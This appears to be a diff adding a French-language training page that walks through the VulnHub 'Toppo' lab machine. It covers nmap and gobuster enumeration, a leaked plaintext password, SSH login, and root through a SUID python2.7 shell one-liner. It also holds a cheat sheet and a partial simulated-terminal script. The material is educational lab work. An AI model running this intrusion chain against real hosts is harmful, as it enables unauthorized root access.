@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Toppo — Chaîne complète</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="lab.css?v=4">
+<!-- Le thème "vrai terminal Kali/BackTrack" (fond noir, entête bordeaux,
+     police terminal, palette de prompt) vit désormais dans lab.css, partagé
+     par tous les cours du hub — plus de surcouche locale ici. -->
+</head>
+<body>
+
+  <div class="wrap">
+    <div class="hero">
+      <p class="breadcrumb"><a href="index.html">← Hub</a></p>
+      <p class="kicker">vulnhub :: nmap → web → ssh → privesc</p>
+      <h1>Toppo<br>Chaîne complète</h1>
+      <p class="lead">Une VM VulnHub d'introduction. Un site web expose un fichier d'indices, on en tire des identifiants SSH, puis un binaire SUID mal configuré donne root. Le parcours type d'un débutant en pentest.</p>
+      <div class="meta-row">
+        <div class="meta-item"><span class="label">Cible</span><span class="value">Toppo · 192.168.56.102</span></div>
+        <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.101</span></div>
+        <div class="meta-item"><span class="label">Réseau</span><span class="value">Host-Only VirtualBox (isolé)</span></div>
+        <div class="meta-item"><span class="label">Résultat</span><span class="badge">root + flag</span></div>
+        <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#5fd9a4; border:1px solid #5fd9a4; background:#5fd9a418;">2/10 · Introduction</span></div>
+        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#6db8ff; border:1px solid #6db8ff; background:#6db8ff18;">5/5 · Root total</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <section id="chrono">
+      <h2 class="section-title">Chronologie</h2>
+      <p class="section-intro">Six étapes, du scan réseau au flag final. On suit toujours le même ordre : reconnaissance, énumération, exploitation, élévation.</p>
+
+      <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
+      <div class="playbook">
+        <div class="playbook-row">
+          <div class="playbook-num">1</div>
+          <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
+          <div class="playbook-why">Repérer SSH (22) et HTTP (80), les deux seuls ports utiles.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">2</div>
+          <div class="playbook-what"><strong>Énumération web</strong><span>gobuster dir</span></div>
+          <div class="playbook-why">Trouver les répertoires cachés : /admin, /mail.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">3</div>
+          <div class="playbook-what"><strong>Fuite d'info</strong><span>notes.txt</span></div>
+          <div class="playbook-why">Identifiants en clair dans un fichier exposé.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">4</div>
+          <div class="playbook-what"><strong>Connexion SSH</strong><span>ssh ted@IP</span></div>
+          <div class="playbook-why">Entrer sur la machine avec les creds trouvés.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">5</div>
+          <div class="playbook-what"><strong>Énumération locale</strong><span>find / -perm -4000</span></div>
+          <div class="playbook-why">Repérer un binaire SUID root anormal.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">6</div>
+          <div class="playbook-what"><strong>Élévation</strong><span>python2.7 SUID → root</span></div>
+          <div class="playbook-why">Shell root immédiat, flag final.</div>
+        </div>
+      </div>
+
+      <div class="timeline">
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <h3>Reconnaissance — nmap</h3>
+          <p class="step-sub">Cartographier les services exposés avant toute chose.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali: ~</div>
+            <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.102<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.102" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 05:58 -0400</span>
+<span class="out">Nmap scan report for 192.168.56.102</span>
+<span class="out">Host is up (0.00023s latency).</span>
+<span class="out">Not shown: 997 closed tcp ports (reset)</span>
+<span class="out">PORT    STATE SERVICE VERSION</span>
+<span class="out">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span>
+<span class="out">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span>
+<span class="out">|_http-title: Clean Blog - Start Bootstrap Theme</span>
+<span class="out">111/tcp open  rpcbind 2-4 (RPC #100000)</span>
+<span class="out">MAC Address: 08:00:27:32:ED:29 (Oracle VirtualBox virtual NIC)</span>
+<span class="out">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">-sV</span><span class="v">détecte les versions des services.</span>
+            <span class="k">-sC</span><span class="v">lance les scripts NSE par défaut (titres HTTP, clés SSH…).</span>
+            <span class="k">à retenir</span><span class="v">On garde <strong>22</strong> (SSH) et <strong>80</strong> (HTTP). 111 (rpcbind) est un service système, inutile ici.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <h3>Énumération web — gobuster</h3>
+          <p class="step-sub">Chercher les répertoires et fichiers cachés derrière Apache.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali: ~</div>
+            <pre><span class="prompt">$</span> gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<button class="copy-btn" type="button" data-copy="gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">===============================================================</span>
+<span class="out">Gobuster v3.8.2</span>
+<span class="out">===============================================================</span>
+<span class="out">[+] Url:                     http://192.168.56.102</span>
+<span class="out">[+] Method:                  GET</span>
+<span class="out">[+] Threads:                 10</span>
+<span class="out">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<span class="out">[+] Negative Status codes:   404</span>
+<span class="out">===============================================================</span>
+<span class="out">Starting gobuster in directory enumeration mode</span>
+<span class="out">===============================================================</span>
+<span class="out">img                  (Status: <span class="st301">301</span>) [Size: 314] [<span class="link">--> http://192.168.56.102/img/</span>]</span>
+<span class="out">mail                 (Status: <span class="st301">301</span>) [Size: 315] [<span class="link">--> http://192.168.56.102/mail/</span>]</span>
+<span class="out">admin                (Status: <span class="st301">301</span>) [Size: 316] [<span class="link">--> http://192.168.56.102/admin/</span>]</span>
+<span class="out">css                  (Status: <span class="st301">301</span>) [Size: 314] [<span class="link">--> http://192.168.56.102/css/</span>]</span>
+<span class="out">manual               (Status: <span class="st301">301</span>) [Size: 317] [<span class="link">--> http://192.168.56.102/manual/</span>]</span>
+<span class="out">js                   (Status: <span class="st301">301</span>) [Size: 313] [<span class="link">--> http://192.168.56.102/js/</span>]</span>
+<span class="out">vendor               (Status: <span class="st301">301</span>) [Size: 317] [<span class="link">--> http://192.168.56.102/vendor/</span>]</span>
+<span class="out">LICENSE              (Status: <span class="st200">200</span>) [Size: 1093]</span>
+<span class="out">server-status        (Status: <span class="st403">403</span>) [Size: 302]</span>
+<span class="out">Progress: 220558 / 220558 (100.00%)</span>
+<span class="out">===============================================================</span>
+<span class="out">Finished</span>
+<span class="out">===============================================================</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">dir</span><span class="v">mode énumération de répertoires.</span>
+            <span class="k">-u</span><span class="v">URL cible.</span>
+            <span class="k">-w</span><span class="v">wordlist utilisée (fournie par le paquet dirbuster sur Kali).</span>
+            <span class="k">à retenir</span><span class="v">On garde <strong>/admin</strong> et <strong>/mail</strong>. Le reste (img, css, js…) est du template.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <h3>Fuite d'information — notes.txt</h3>
+          <p class="step-sub">Un fichier texte exposé contient les identifiants.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>navigateur / curl</div>
+            <pre><span class="prompt">$</span> curl http://192.168.56.102/admin/notes.txt<button class="copy-btn" type="button" data-copy="curl http://192.168.56.102/admin/notes.txt" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Note to myself :</span>
+<span class="out">I need to change my password :/</span>
+<span class="out">12345ted123 is too outdated but the technology isn't my thing</span>
+<span class="out">i prefer go fishing or watching soccer .</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">mot de passe</span><span class="v"><strong>12345ted123</strong> — en clair dans le fichier.</span>
+            <span class="k">indice user</span><span class="v">Le mot de passe commence par « <strong>ted</strong> » et le texte parle de « fishing ». Le compte est <strong>ted</strong>.</span>
+            <span class="k">à retenir</span><span class="v">Toujours fouiller les répertoires admin/mail : c'est là que les devs laissent traîner des fichiers.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <h3>Connexion SSH — ted</h3>
+          <p class="step-sub">On entre sur la machine avec les identifiants trouvés.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali: ~</div>
+            <pre><span class="prompt">$</span> ssh ted@192.168.56.102<button class="copy-btn" type="button" data-copy="ssh ted@192.168.56.102" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">The authenticity of host '192.168.56.102' can't be established.</span>
+<span class="out">ED25519 key fingerprint is: SHA256:vJgmhqKOmHq0Mb0plSTyOdzw6GenPEkZkch+PIVozzw</span>
+<span class="out">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="out">Warning: Permanently added '192.168.56.102' (ED25519) to the list of known hosts.</span>
+<span class="out">ted@192.168.56.102's password: </span>
+<span class="out">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY.</span>
+<span class="out">Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29</span>
+<span class="prompt">ted@Toppo:~$</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">mot de passe</span><span class="v">12345ted123 (saisi à l'aveugle, il ne s'affiche pas).</span>
+            <span class="k">invite</span><span class="v">ted@Toppo:~$ → on est connecté en tant que ted.</span>
+            <span class="k">à retenir</span><span class="v">Le serveur peut être vieux (OpenSSH 6.7). Si Kali refuse, ajouter -oHostKeyAlgorithms=+ssh-rsa.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">5</div>
+          <h3>Énumération locale — SUID</h3>
+          <p class="step-sub">Après un premier accès, on cherche les moyens de passer root.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>ted@Toppo: ~</div>
+            <pre><span class="prompt">ted@Toppo:~$</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span>
+
+<span class="prompt">ted@Toppo:~$</span> uname -a<button class="copy-btn" type="button" data-copy="uname -a" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Linux Toppo 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux</span>
+
+<span class="prompt">ted@Toppo:~$</span> sudo -l<button class="copy-btn" type="button" data-copy="sudo -l" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">-bash: sudo: command not found</span>
+
+<span class="prompt">ted@Toppo:~$</span> find / -perm -4000 -type f 2>/dev/null<button class="copy-btn" type="button" data-copy="find / -perm -4000 -type f 2>/dev/null" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">/sbin/mount.nfs</span>
+<span class="out">/usr/sbin/exim4</span>
+<span class="out">/usr/lib/eject/dmcrypt-get-device</span>
+<span class="out">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="out">/usr/lib/openssh/ssh-keysign</span>
+<span class="out">/usr/bin/gpasswd</span>
+<span class="out">/usr/bin/newgrp</span>
+<span class="out">/usr/bin/python2.7</span>
+<span class="out">/usr/bin/chsh</span>
+<span class="out">/usr/bin/at</span>
+<span class="out">/usr/bin/mawk</span>
+<span class="out">/usr/bin/chfn</span>
+<span class="out">/usr/bin/procmail</span>
+<span class="out">/usr/bin/passwd</span>
+<span class="out">/bin/su</span>
+<span class="out">/bin/umount</span>
+<span class="out">/bin/mount</span>
+
+<span class="prompt">ted@Toppo:~$</span> ls -la /usr/bin/python2.7<button class="copy-btn" type="button" data-copy="ls -la /usr/bin/python2.7" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out"><span class="err">-rwsrwxrwx</span> 1 root root 3889608 Aug 13  2016 <span class="exe">python2.7</span></span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">sudo -l</span><span class="v">sudo n'est pas installé → la voie classique est fermée.</span>
+            <span class="k">uname -a</span><span class="v">noyau 3.16 (2017) → très vieux, exploitable en théorie (Dirty COW) mais ce n'est pas le chemin prévu ici.</span>
+            <span class="k">find -perm -4000</span><span class="v">liste tous les binaires SUID. La plupart sont standards.</span>
+            <span class="k">anomalie</span><span class="v"><strong>/usr/bin/python2.7</strong> est SUID root → c'est LUI. Aucune Debian standard ne fait ça.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">6</div>
+          <h3>Élévation — python2.7 SUID → root</h3>
+          <p class="step-sub">Un interpréteur SUID root donne un shell root immédiat.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>ted@Toppo: ~</div>
+            <pre><span class="prompt">ted@Toppo:~$</span> python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'<button class="copy-btn" type="button" data-copy="python2.7 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">root@Toppo:~#</span> whoami<button class="copy-btn" type="button" data-copy="whoami" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">root</span>
+
+<span class="prompt">root@Toppo:~#</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">uid=0(root) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)</span>
+
+<span class="prompt">root@Toppo:~#</span> ls -la /root/<button class="copy-btn" type="button" data-copy="ls -la /root/" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">total 24</span>
+<span class="out">drwx------  2 root root 4096 Apr 15  2018 .</span>
+<span class="out">drwxr-xr-x 21 root root 4096 Apr 15  2018 ..</span>
+<span class="out">-rw-------  1 root root   53 Apr 15  2018 .bash_history</span>
+<span class="out">-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc</span>
+<span class="out">-rw-r--r--  1 root root  397 Apr 15  2018 flag.txt</span>
+<span class="out">-rw-r--r--  1 root root  140 Nov 19  2007 .profile</span>
+
+<span class="prompt">root@Toppo:~#</span> cat /root/flag.txt<button class="copy-btn" type="button" data-copy="cat /root/flag.txt" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">_________                                  </span>
+<span class="out">|  _   _  |                                 </span>
+<span class="out">|_/ | | \_|.--.   _ .--.   _ .--.    .--.   </span>
+<span class="out">    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ </span>
+<span class="out">   _| |_ | \__. | | \__/ | | \__/ || \__. | </span>
+<span class="out">  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  </span>
+<span class="out">                 [__|     [__|              </span>
+<span class="flag">Congratulations ! there is your flag : 0wnedlab{••••••••••••••••}</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">os.setuid(0)</span><span class="v">force l'UID effectif à root (le SUID du binaire le permet déjà).</span>
+            <span class="k">os.system("/bin/bash")</span><span class="v">lance un shell qui hérite de root.</span>
+            <span class="k">invite</span><span class="v">root@Toppo:~# → le <strong>#</strong> confirme root.</span>
+            <span class="k">flag</span><span class="v">à récupérer toi-même dans le terminal, puis à valider avec le champ <strong>flag</strong> en bas du terminal.</span>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <section id="cheatsheet">
+      <h2 class="section-title">Commandes à retenir</h2>
+
+      <div class="cheat-group">
+        <h4>reconnaissance</h4>
+        <table class="cheat">
+          <tr><td class="cmd">nmap -sV -sC IP</td><td class="desc">ports + versions + scripts NSE</td></tr>
+          <tr><td class="cmd">gobuster dir -u URL -w WORDLIST</td><td class="desc">énumération de répertoires web</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>accès initial</h4>
+        <table class="cheat">
+          <tr><td class="cmd">curl http://IP/chemin/fichier.txt</td><td class="desc">lire un fichier exposé</td></tr>
+          <tr><td class="cmd">ssh user@IP</td><td class="desc">connexion SSH</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>énumération locale</h4>
+        <table class="cheat">
+          <tr><td class="cmd">id</td><td class="desc">utilisateur + groupes</td></tr>
+          <tr><td class="cmd">uname -a</td><td class="desc">version du noyau</td></tr>
+          <tr><td class="cmd">sudo -l</td><td class="desc">droits sudo (si sudo est installé)</td></tr>
+          <tr><td class="cmd">find / -perm -4000 -type f 2>/dev/null</td><td class="desc">binaires SUID</td></tr>
+          <tr><td class="cmd">ls -la /etc/cron*</td><td class="desc">tâches planifiées</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>élévation — SUID</h4>
+        <table class="cheat">
+          <tr><td class="cmd">python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</td><td class="desc">shell root via python SUID</td></tr>
+          <tr><td class="cmd">cat /root/flag.txt</td><td class="desc">lire le flag root</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="concepts">
+      <h2 class="section-title">Ce qu'il faut vraiment comprendre</h2>
+      <div class="concepts">
+        <div class="concept">
+          <h4>On énumère avant d'exploiter</h4>
+          <p>Chaque étape produit une info qui guide la suivante. nmap donne les ports → gobuster donne les répertoires → notes.txt donne les creds → SSH donne un shell → find donne le SUID → le SUID donne root.</p>
+        </div>
+        <div class="concept">
+          <h4>Un SUID anormal, c'est une porte ouverte</h4>
+          <p>Sur Debian, python2.7 n'est jamais SUID root. Dès qu'un binaire interpréteur (python, perl, vim, less…) est SUID, il donne un shell root immédiat. Réflexe : comparer la liste SUID à ce qu'on attend.</p>
+        </div>
+        <div class="concept">
+          <h4>Un mot de passe dans un fichier web est une fuite classique</h4>
+          <p>Les répertoires <code>/admin</code>, <code>/backup</code>, <code>/mail</code> contiennent souvent des notes, des logs ou des exports oubliés. Toujours les lister après gobuster.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="practice">
+      <h2 class="section-title">Terminal d'entraînement</h2>
+      <p class="section-intro">Rejoue la chaîne complète, commande par commande. Le shell change d'utilisateur au fur et à mesure — comme sur la vraie machine.</p>
+
+      <div class="term-launch">
+        <button class="term-launch-btn" id="term-open-btn" type="button">
+          <span class="term-launch-dot"></span>
+          Ouvrir le terminal
+        </button>
+        <p class="term-launch-sub">Plein écran · shell simulé · historique ↑ / ↓</p>
+      </div>
+    </section>
+
+    <footer>
+      <div class="note">
+        <span class="ok">✓</span> lab isolé — réseau Host-Only VirtualBox.
+      </div>
+    </footer>
+  </div>
+
+  <div class="term-fullscreen" id="term-fullscreen">
+    <div class="term-fs-header">
+      <div class="term-fs-headrow">
+        <div class="term-fs-titlebar">
+          <button type="button" class="term-fs-dot r" id="term-close-dot" aria-label="Fermer le terminal" title="Fermer le terminal"></button>
+          <span class="term-fs-dot y"></span><span class="term-fs-dot g"></span>
+          <span class="term-fs-context" id="sim-context">kali@kali</span>
+        </div>
+        <button class="term-fs-close" id="term-fsbtn" type="button" aria-label="Basculer en plein écran" title="Plein écran">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M4 9V4h5"/>
+            <path d="M20 9V4h-5"/>
+            <path d="M4 15v5h5"/>
+            <path d="M20 15v5h-5"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div class="term-menubar" aria-hidden="true">
+      <span>Session</span><span>Actions</span><span>Edit</span><span>View</span><span>Help</span>
+    </div>
+    <div class="term-fs-header term-fs-header--lower">
+      <div class="term-fs-info">
+        <span class="item">Cible <strong id="ib-target">192.168.56.102</strong></span>
+        <span class="item">Attaquant <strong id="ib-attacker">192.168.56.101</strong></span>
+      </div>
+      <div class="phase-track" id="phase-track"></div>
+      <div class="term-progress">
+        <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
+        <span class="term-progress-label" id="sim-progress">étape 1/6</span>
+      </div>
+      <div class="term-fs-consigne" id="term-fs-consigne">
+        <span class="consigne-tag" id="consigne-tag">Consigne</span>
+        <span class="consigne-text" id="consigne-text">—</span>
+      </div>
+    </div>
+
+    <div class="sim-body" id="sim-body">
+      <div class="sim-line sim-inputline" id="sim-inputline">
+        <span class="p" id="sim-prompt-label">$</span>
+        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ pour l'historique)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" inputmode="text">
+      </div>
+    </div>
+
+    <div class="term-fs-footer">
+      <div class="sim-hint-box" id="sim-hint-box"></div>
+      <div class="sim-controls">
+        <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
+        <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
+        <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
+        <form class="flag-form" id="flag-form" autocomplete="off" novalidate>
+          <span class="flag-icon" aria-hidden="true">⚑</span>
+          <input id="flag-input" class="flag-input" type="text" placeholder="0wnedlab{…}" aria-label="Flag à valider" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="120" name="flag-answer-not-stored">
+          <button type="submit" class="sim-btn flag-submit" id="flag-submit">Valider</button>
+          <span class="flag-msg" id="flag-msg" role="status" aria-live="polite"></span>
+        </form>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="flag-modal" id="flag-modal" role="dialog" aria-modal="true" aria-labelledby="flag-modal-title" aria-hidden="true">
+    <canvas class="flag-confetti" id="flag-confetti" aria-hidden="true"></canvas>
+    <div class="flag-card" id="flag-card">
+      <div class="flag-card-bar">
+        <button type="button" class="term-fs-dot r" id="flag-modal-x" aria-label="Fermer" title="Fermer"></button><span class="term-fs-dot y"></span><span class="term-fs-dot g"></span>
+        <span class="flag-card-title">toppo — validation</span>
+      </div>
+      <div class="flag-card-body">
+        <div class="flag-seal" aria-hidden="true">
+          <svg viewBox="0 0 120 120">
+            <circle class="seal-ring" cx="60" cy="60" r="52"/>
+            <circle class="seal-ring-2" cx="60" cy="60" r="44"/>
+            <path class="seal-check" d="M38 62 L54 78 L84 44"/>
+          </svg>
+        </div>
+        <p class="flag-kicker">accès root confirmé</p>
+        <h2 class="flag-card-h" id="flag-modal-title">Flag validé</h2>
+        <p class="flag-sub">Machine <strong>Toppo</strong> compromise : de nmap jusqu'au shell root.</p>
+        <div class="flag-log" aria-hidden="true">
+          <div><span class="fl-p">$</span> verify --flag <span class="fl-ok">ok</span></div>
+          <div><span class="fl-p">$</span> id <span class="fl-dim">→</span> <span class="fl-ok">uid=0(root)</span></div>
+          <div><span class="fl-p">$</span> status <span class="fl-dim">→</span> <span class="fl-gold">PWNED</span></div>
+        </div>
+        <div class="flag-stats">
+          <div><span class="fs-k">durée</span><span class="fs-v" id="flag-stat-time">—</span></div>
+          <div><span class="fs-k">indices</span><span class="fs-v" id="flag-stat-hints">0</span></div>
+          <div><span class="fs-k">solutions</span><span class="fs-v" id="flag-stat-sols">0</span></div>
+        </div>
+        <div class="flag-actions">
+          <button type="button" class="sim-btn flag-primary" id="flag-modal-close">Continuer</button>
+          <button type="button" class="sim-btn" id="flag-modal-replay">↺ Rejouer</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+  // Validation du flag : on ne stocke qu'une empreinte salée (SHA-256), jamais le flag en clair.
+  const FLAG_SALT = "toppo\u00b7lab\u00b7v1\u00b7";
+  const FLAG_HASH = "805303268a2f81cbeec3a0d2321bda4f1bd28a8905570d4d1018b4fc30ca1030";
+</script>
+<script>
+  const steps = [
+    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
+      task:"Lance une reconnaissance complète de la cible.",
+      accepted:["nmap -sv -sc 192.168.56.102"],
+      hint:"-sV + -sC + IP.",
+      hint2:"nmap -sV -sC 192.168.56.102",
+      note:"nmap -sV -sC &lt;cible&gt; → ports, versions, scripts NSE.",
+      output:[
+        {t:"Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 05:58 -0400", c:"o"},
+        {t:"Nmap scan report for 192.168.56.102", c:"o"},
+        {t:"Host is up (0.00023s latency).", c:"o"},
+        {t:"Not shown: 997 closed tcp ports (reset)", c:"o"},
+        {t:"PORT    STATE SERVICE VERSION", c:"o"},
+        {t:"22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)", c:"o", id:"hl-ssh"},
+        {t:"80/tcp  open  http    Apache httpd 2.4.10 ((Debian))", c:"o", id:"hl-http"},
+        {t:"|_http-title: Clean Blog - Start Bootstrap Theme", c:"o"},
+        {t:"111/tcp open  rpcbind 2-4 (RPC #100000)", c:"o"},
+        {t:"MAC Address: 08:00:27:32:ED:29 (Oracle VirtualBox virtual NIC)", c:"o"},
+        {t:"Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel", c:"o"},
+        {t:"", c:"o"},
+        {t:"Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .", c:"o"},
+        {t:"Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds", c:"o"}
+      ] },
+
+    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
+      task:"Énumère les répertoires web de la cible.",
+      accepted:["gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"],
+      hint:"Outil : gobuster. Mode : dir. -u URL. -w wordlist.",
+      hint2:"gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+      note:"gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; → liste des répertoires/fichiers accessibles.",
+      output:[
+        {t:"===============================================================", c:"o"},
+        {t:"Gobuster v3.8.2", c:"o"},
+        {t:"===============================================================", c:"o"},
+        {t:"[+] Url:                     http://192.168.56.102", c:"o"},
+        {t:"[+] Method:                  GET", c:"o"},
+        {t:"[+] Threads:                 10", c:"o"},
+        {t:"[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", c:"o"},
+        {t:"===============================================================", c:"o"},
+        {t:"Starting gobuster in directory enumeration mode", c:"o"},
+        {t:"===============================================================", c:"o"},
+        {t:"img                  (Status: 301) [Size: 314] [--> http://192.168.56.102/img/]", c:"o"},
+        {t:"mail                 (Status: 301) [Size: 315] [--> http://192.168.56.102/mail/]", c:"o"},
+        {t:"admin                (Status: 301) [Size: 316] [--> http://192.168.56.102/admin/]", c:"o", id:"hl-admin"},
+        {t:"css                  (Status: 301) [Size: 314] [--> http://192.168.56.102/css/]", c:"o"},
+        {t:"manual               (Status: 301) [Size: 317] [--> http://192.168.56.102/manual/]", c:"o"},
+        {t:"js                   (Status: 301) [Size: 313] [--> http://192.168.56.102/js/]", c:"o"},
+        {t:"vendor               (Status: 301) [Size: 317] [--> http://192.168.56.102/vendor/]", c:"o"},
+        {t:"LICENSE              (Status: 200) [Size: 1093]", c:"ok"},
+        {t:"server-status        (Status: 403) [Size: 302]", c:"err"},
+        {t:"Progress: 220558 / 220558 (100.00%)", c:"o"},
+        {t:"===============================================================", c:"o"},
+        {t:"Finished", c:"o"},
+        {t:"===============================================================", c:"o"}
+      ] },
+
+    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
+      task:"Lis le fichier d'indices exposé dans /admin/.",
+      accepted:["curl http://192.168.56.102/admin/notes.txt"],
+      hint:"curl + URL complète du fichier notes.txt trouvé dans /admin/.",
+      hint2:"curl http://192.168.56.102/admin/notes.txt",
+      note:"curl &lt;URL&gt; → récupère le contenu brut d'un fichier exposé.",
+      output:[
+        {t:"Note to myself :", c:"o"},
+        {t:"I need to change my password :/", c:"o"},
+        {t:"12345ted123 is too outdated but the technology isn't my thing", c:"ok", id:"hl-pass"},
+        {t:"i prefer go fishing or watching soccer .", c:"o"}
+      ] },
+
+    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"$",
+      task:"Connecte-toi en SSH avec l'utilisateur trouvé.",
+      accepted:["ssh ted@192.168.56.102"],
+      hint:"ssh + utilisateur (ted) + @ + IP.",
+      hint2:"ssh ted@192.168.56.102",
+      note:"ssh &lt;user&gt;@&lt;IP&gt; → connexion distante. La clé d'hôte sera d'abord demandée.",
+      output:[
+        {t:"The authenticity of host '192.168.56.102' can't be established.", c:"o"},
+        {t:"ED25519 key fingerprint is: SHA256:vJgmhqKOmHq0Mb0plSTyOdzw6GenPEkZkch+PIVozzw", c:"o"},
+        {t:"Are you sure you want to continue connecting (yes/no/[fingerprint])? ", c:"o"}
+      ] },
+
+    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"",
+      task:"Accepte l'empreinte de la clé d'hôte pour poursuivre la connexion.",
+      accepted:["yes"],
+      hint:"Il faut répondre explicitement par écrit, pas juste appuyer sur Entrée.",
+      hint2:"yes",
+      note:"Tape yes pour faire confiance à cette clé d'hôte et l'ajouter à known_hosts.",
+      output:[
